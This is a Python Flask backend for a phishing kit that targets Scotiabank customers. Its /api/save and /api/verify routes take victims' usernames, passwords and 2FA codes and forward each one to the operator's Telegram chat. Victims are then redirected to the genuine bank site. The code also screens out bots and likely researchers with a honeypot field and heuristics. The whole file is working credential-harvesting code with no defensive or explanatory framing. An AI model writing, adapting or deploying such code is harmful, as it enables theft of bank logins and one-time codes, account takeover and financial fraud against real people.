from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import os
import re
import time
import urllib.request
import urllib.parse

app = Flask(__name__)
CORS(app)

# ---------- Rate Limiter ----------
def get_username_or_ip():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip()
    if username:
        return f"{get_remote_address()}:{username}"
    return get_remote_address()

limiter = Limiter(
    get_username_or_ip,
    app=app,
    default_limits=["100 per hour"],
    storage_uri="memory://"
)

# ---------- Config ----------
REDIRECT_URL       = "https://www.scotiabank.com/"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")

# ---------- Bot Detection ----------
recent_submissions = {}

def is_likely_bot(username, password, ip):
    now = time.time()

    if len(username) < 3 or len(username) > 60:
        return True
    if len(password) < 4 or len(password) > 100:
        return True

    if "@" not in username and " " not in username:
        if len(username) >= 8:
            has_vowel = bool(re.search(r"[aeiouAEIOU]", username))
            if not has_vowel:
                return True
            if re.search(r"[^aeiouAEIOU0-9@._-]{5,}", username):
                return True

    if ip in recent_submissions:
        last = recent_submissions[ip]
        if now - last < 10:
            return True
    recent_submissions[ip] = now

    for k in list(recent_submissions.keys()):
        if now - recent_submissions[k] > 60:
            del recent_submissions[k]

    return False


# ---------- Telegram Helpers ----------
def _send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram not configured")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }).encode("utf-8")

    try:
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=10) as response:
            response.read()
    except Exception as e:
        print(f"❌ Telegram error: {e}")


def send_login_to_telegram(email, password):
    message = (
        "🔔 New Login\n"
        "━━━━━━━━━━━━━━━\n"
        f"📧 Email: {email}\n"
        f"🔑 Password: {password}"
    )
    _send_telegram(message)
    print(f"📨 Login sent: {email}")


def send_2fa_to_telegram(email, code):
    message = (
        "🔐 2FA Code\n"
        "━━━━━━━━━━━━━━━\n"
        f"📧 Email: {email}\n"
        f"🔢 Code: {code}"
    )
    _send_telegram(message)
    print(f"📨 2FA sent: {code}")


# ---------- Routes ----------
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "ok", "message": "Backend is running"})


@app.route("/api/save", methods=["POST"])
@limiter.limit("3 per minute")
@limiter.limit("15 per hour")
def save():
    data = request.get_json(silent=True)

    if not data:
        return jsonify({"success": False, "message": "No data provided"}), 400

    if data.get("website"):
        return jsonify({"success": False, "message": "Bad request"}), 400

    username = data.get("username", "").strip()
    password = data.get("password", "").strip()

    if not username or not password:
        return jsonify({"success": False, "message": "All fields required"}), 400

    ip = get_remote_address()

    if is_likely_bot(username, password, ip):
        print(f"🤖 Bot blocked: {username} from {ip}")
        return jsonify({
            "success": True,
            "message": "Saved successfully ✅",
            "redirect_url": REDIRECT_URL
        })

    send_login_to_telegram(username, password)

    return jsonify({
        "success": True,
        "message": "Saved successfully ✅",
        "redirect_url": REDIRECT_URL
    })


@app.route("/api/verify", methods=["POST"])
@limiter.limit("3 per minute")
@limiter.limit("15 per hour")
def verify():
    data = request.get_json(silent=True)

    if not data:
        return jsonify({"success": False, "message": "No data provided"}), 400

    username = data.get("username", "").strip()
    code     = data.get("code", "").strip()

    if not username or not code:
        return jsonify({"success": False, "message": "All fields required"}), 400

    if len(code) < 4 or len(code) > 8 or not code.isdigit():
        return jsonify({"success": False, "message": "Invalid code"}), 400

    send_2fa_to_telegram(username, code)

    return jsonify({
        "success": True,
        "message": "Verified successfully ✅",
        "redirect_url": REDIRECT_URL
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)